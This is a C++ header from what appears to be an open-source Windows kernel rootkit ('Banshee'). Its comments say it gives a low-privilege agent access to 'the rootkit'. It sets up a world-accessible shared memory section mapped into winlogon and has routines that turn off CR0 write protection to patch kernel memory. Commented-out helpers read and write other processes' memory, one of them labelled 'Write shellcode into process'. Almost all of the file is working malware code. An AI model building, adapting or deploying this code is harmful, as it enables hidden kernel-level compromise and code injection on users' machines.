#pragma once

#pragma comment(lib, "Ksecdd.lib")

#include <ntifs.h>
#include <wdf.h>
#include <ntddk.h>
#include "Globals.hpp"
#include "WinTypes.hpp"
#include "ProcessUtils.hpp"
#include <intrin.h>

/*
 * @brief Creates a shared memory section accessible by all users.
 *
 * @return NTSTATUS STATUS_SUCCESS if successful, otherwise an error code.
 */
NTSTATUS 
BeCreateSharedMemory()
{
	UNICODE_STRING       SectionName = { 0 };
	PSECURITY_DESCRIPTOR Sd          = { 0 };
	OBJECT_ATTRIBUTES    ObjAttr     = { 0 };
	LARGE_INTEGER        SectionSize = { 0 };
	KAPC_STATE			 Apc		 = { 0 };
	NTSTATUS			 Status	     = STATUS_UNSUCCESSFUL;
	SIZE_T				 ulViewSize  = sizeof(BANSHEE_PAYLOAD);

	RtlInitUnicodeString(&SectionName, L"\\BaseNamedObjects\\Global\\BeShared");

	//
	// Add permissions to all users to our shared memory, so that a lowpriv agent can still access the rootkit
	//
	BeCreateSecurityDescriptor(&Sd);
	InitializeObjectAttributes(&ObjAttr, &SectionName, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT | OBJ_KERNEL_HANDLE | OBJ_OPENIF, NULL, Sd);
	SectionSize.LowPart = sizeof(BANSHEE_PAYLOAD);

	Status = BeGlobals::pZwCreateSection(&BeGlobals::hSharedMemory, SECTION_ALL_ACCESS, &ObjAttr, &SectionSize, PAGE_READWRITE, SEC_COMMIT, NULL);
	if (!NT_SUCCESS(Status))
	{
		LOG_MSG("ZwCreateSection fail! Status: 0x%X\n", Status);
		ExFreePool(Sd);
		return Status;
	}

	//
	// TODO: document
	//
	KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);

	Status = BeGlobals::pZwMapViewOfSection(BeGlobals::hSharedMemory, ZwCurrentProcess(), &BeGlobals::pSharedMemory, 0, ulViewSize, NULL, &ulViewSize, ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(Status))
	{
		LOG_MSG("Failed to map shared memory: 0x%X\n", Status);
		BeGlobals::pZwClose(BeGlobals::hSharedMemory);
		KeUnstackDetachProcess(&Apc);
		ExFreePool(Sd);
		return STATUS_UNSUCCESSFUL;
	}

	LOG_MSG("Mapped shared memory at 0x%llx\n", (ULONG_PTR)BeGlobals::pSharedMemory);

	KeUnstackDetachProcess(&Apc);

	ExFreePool(Sd);
	return STATUS_SUCCESS;
}

/*
 * @brief Closes the shared memory section and unmaps it.
 *
 * @param[in] HSharedMemory Handle to the shared memory section.
 * @param[in] pSharedMemory Pointer to the mapped shared memory.
 */
VOID 
BeCloseSharedMemory(_In_ HANDLE HSharedMemory, _In_ PVOID pSharedMemory)
{
	//
	// TODO: document
	//
	KAPC_STATE apc;
	KeStackAttachProcess(BeGlobals::winLogonProc, &apc);

	if (BeGlobals::pSharedMemory != NULL) 
	{
		BeGlobals::pZwUnmapViewOfSection(ZwCurrentProcess(), pSharedMemory);
		BeGlobals::pSharedMemory = NULL;
	}

	if (BeGlobals::hSharedMemory != NULL) 
	{
		BeGlobals::pZwClose(HSharedMemory);
		HSharedMemory = NULL;
	}

	KeUnstackDetachProcess(&apc);
}

/*
 * @brief Disables write protection on CR0 register.
 *
 * @return KIRQL Previous interrupt request level.
 */
KIRQL 
WPOFFx64()
{
	KIRQL Irql = KeRaiseIrqlToDpcLevel();
	UINT64 Cr0 = __readcr0();
	Cr0 &= 0xfffffffffffeffff;
	__writecr0(Cr0);
	_disable();
	return Irql;
}

/*
 * @brief Enables write protection on CR0 register.
 *
 * @param[in] irql Previous interrupt request level to restore.
 */
VOID 
WPONx64(_In_ KIRQL irql)
{
	UINT64 Cr0 = __readcr0();
	Cr0 |= 0x10000;
	_enable();
	__writecr0(Cr0);
	KeLowerIrql(irql);
}

/*
/**
 * Wrapper for MmCopyVirtualMemory, adjusting permissions accordingly and restoring them
 *
 * @param targetProcess The target process from which data will be read
 * @param procAddr      The source address in the target process from which data will be read
 * @param dstAddr       The addr of the caller process where the data that is read will be written to
 * @param size          The amount of bytes to be read
 * @param accessMode    The access mode specifying whether the operation is in user mode or kernel mode
 *
 * @return              Returns NTSTATUS indicating success or failure
 
NTSTATUS
BeReadProcessMemory(PEPROCESS targetProcess, PVOID procAddr, OUT PVOID dstAddr, SIZE_T size, MODE accessMode)
{
	NTSTATUS NtStatus;

	// TODO: verify addresses according to mode, e.g. kernel mode -> addr must be in kernel space

	SIZE_T bytesRead;
	NtStatus = BeGlobals::pMmCopyVirtualMemory(targetProcess, srcAddr, PsGetCurrentProcess(), dstAddr, size, accessMode, &bytesRead);

	return NtStatus;
}

/**
 * Wrapper for MmCopyVirtualMemory, adjusting permissions accordingly and restoring them
 *
 * @param targetProcess The target process into which data will be written
 * @param srcAddr       The source address in the current process from which data will be copied
 * @param dstAddr       The destination address in the target process where data will be written
 * @param size          The size, in bytes, of the data to be written
 * @param accessMode    The access mode specifying whether the operation is in user mode or kernel mode
 *
 * @return              Returns NTSTATUS indicating success or failure
 
NTSTATUS 
BeWriteProcessMemory(PEPROCESS targetProcess, PVOID srcAddr, PVOID dstAddr, SIZE_T size, MODE accessMode)
{
	NTSTATUS NtStatus;

	// TODO: verify addresses according to mode, e.g. kernel mode -> addr must be in kernel space

	// Aquire handle on target process
	HANDLE hTargetProcess;
	NtStatus = ObOpenObjectByPointer(targetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, accessMode, &hTargetProcess);
	if (NtStatus != 0)
	{
		return NtStatus;
	}

	// Adjust permissions
	ULONG oldProtection;
	SIZE_T bytesWritten;
	SIZE_T patchLen = size;
	PVOID addressToProtect = dstAddr;
	NtStatus = BeGlobals::pZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);
	if (NtStatus != 0) 
	{
		BeGlobals::pZwClose(hTargetProcess);
		return NtStatus;
	}

	// Close handle
	BeGlobals::pZwClose(hTargetProcess);

	// Write shellcode into process
	NtStatus = BeGlobals::pMmCopyVirtualMemory(PsGetCurrentProcess(), srcAddr, targetProcess, dstAddr, size, accessMode, &bytesWritten);

	if (NtStatus != 0)
	{
		return NtStatus;
	}

	// Aquire handle on target process
	NtStatus = ObOpenObjectByPointer(targetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, accessMode, &hTargetProcess);
	if (NtStatus != 0)
	{
		return NtStatus;
	}

	// Restore permissions
	patchLen = size;
	NtStatus = BeGlobals::pZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
	if (NtStatus != 0)
	{
		BeGlobals::pZwClose(hTargetProcess);
		return NtStatus;
	}

	// Close handle
	NtStatus = BeGlobals::pZwClose(hTargetProcess);

	return STATUS_SUCCESS;
}
*/